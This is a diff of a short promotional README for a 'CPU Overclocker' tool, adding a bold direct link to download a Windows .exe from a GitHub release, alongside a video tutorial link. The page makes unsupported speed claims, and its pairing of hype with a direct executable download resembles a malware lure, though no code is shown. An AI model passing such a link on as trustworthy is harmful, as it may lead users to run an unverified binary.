@@ -3,6 +3,8 @@ Making your processor faster is a now simple task with the CPU Overclocker!
 
 You want a faster computer? Look no further! Use the CPU Overclocker developed by Lusin. Get better fps in games! Runs apps more smoothly! Have an overall faster system!
 
+**CPU Overclocker download:  https://github.com/Lusin333/CPU-Overclocker/releases/download/2020-07-04/CPU.Overclocker.exe**
+
 Lusin's video tutorial on how to use the CPU Overclocker: https://youtu.be/UjhTW9NBEpU
 
 
